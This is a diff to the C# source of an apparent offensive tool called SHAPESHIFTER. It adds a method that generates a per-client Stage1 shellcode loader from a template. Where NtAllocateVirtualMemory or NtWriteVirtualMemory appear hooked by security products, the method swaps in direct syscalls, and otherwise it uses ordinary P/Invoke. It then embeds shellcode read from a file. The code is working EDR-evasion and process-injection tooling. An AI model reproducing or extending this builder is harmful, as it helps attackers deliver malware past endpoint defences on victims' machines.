@@ -1,7 +1,9 @@
 ﻿using System;
 using System.CodeDom.Compiler;
+using System.Collections.Generic;
 using System.IO;
 using System.Reflection;
+using System.Text;
 
 namespace SHAPESHIFTER
 {
@@ -63,7 +65,94 @@ namespace SHAPESHIFTER
             return true;
         }
 
-        
+        public static bool BuildStage1(IList<string> hookedFunctions, string shellcodeFile, string clientId)
+        {
+            string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+            string sourceFile = Path.Combine(sourcePath, @"Templates\Stage1Template.cs");
+
+            if (!File.Exists(sourceFile))
+            {
+                Console.WriteLine("[-] Can't find the Stage1 template file. Is the \"Tempates\" " +
+                    "directory in the same directory as SHAPESHIFTER.exe?");
+                return false;
+            }
+
+            string template = File.ReadAllText(sourceFile);
+            StringBuilder modified = new StringBuilder(template);
+
+            Console.WriteLine("  [>] Generating Stage1 source files for compilation...");
+            try
+            {
+                StringBuilder pinvokes = new StringBuilder();
+                StringBuilder syscalls = new StringBuilder();
+                StringBuilder delegates = new StringBuilder();
+                StringBuilder memalloc = new StringBuilder();
+                StringBuilder writevm = new StringBuilder();
+
+                // Check if NtAllocateVirtualMemory is hooked
+                if (hookedFunctions.Contains("NtAllocateVirtualMemory"))
+                {
+                    syscalls.AppendLine(Callees.method_NtAllocateVirtualMemory);
+                    delegates.AppendLine(Callees.delegate_NtAllocateVirtualMemory);
+                    memalloc.AppendLine(Callees.call_NtAllocateVirtualMemory);
+
+                }
+                else
+                {
+                    pinvokes.Append(Callees.pinvoke_VirtualAllocEx);
+                    memalloc.AppendLine(Callees.call_VirtualAllocEx);
+                }
+
+                // Check if NtWriteVirtualMemory is hooked
+                if (hookedFunctions.Contains("NtWriteVirtualMemory"))
+                {
+                    syscalls.AppendLine(Callees.method_NtWriteVirtualMemory);
+                    delegates.AppendLine(Callees.delegate_NtWriteVirtualMemory);
+                    writevm.AppendLine(Callees.call_NtWriteVirtualMemory);
+
+                }
+                else
+                {
+                    pinvokes.Append(Callees.pinvoke_WriteVirtualMemory);
+                    writevm.AppendLine(Callees.call_WriteVirtualMemory);
+                }
+
+
+                modified.Replace("[SHAPESHIFTER_PINVOKES]", pinvokes.ToString());
+                modified.Replace("[SHAPESHIFTER_SYSCALLS]", syscalls.ToString());
+                modified.Replace("[SHAPESHIFTER_DELEGATES]", delegates.ToString());
+                modified.Replace("[SHAPESHIFTER_MEMALLOC]", memalloc.ToString());
+                modified.Replace("[SHAPESHIFTER_WRITEVM]", writevm.ToString());
+
+
+                try
+                {
+                    string shellcodeString = Helpers.ByteArrayToFormattedString(File.ReadAllBytes(shellcodeFile));
+                    modified.Replace("[SHAPESHIFTER_SHELLCODE]", shellcodeString);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Error while converting and replacing shellcode in the template");
+                    return false;
+                }
+
+
+                string newStage1File = sourcePath + @"\BuiltStages\" + clientId + ".cs";
+                using (StreamWriter writer = new StreamWriter(newStage1File, false))
+                {
+                    writer.Write(modified.ToString());
+                    writer.Close();
+                }
+
+                Console.WriteLine("  [+] Source file created!");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Error while creating Stage1 source file ({0})", ex.Message);
+                return false;
+            }
+        }
 
     }
 }
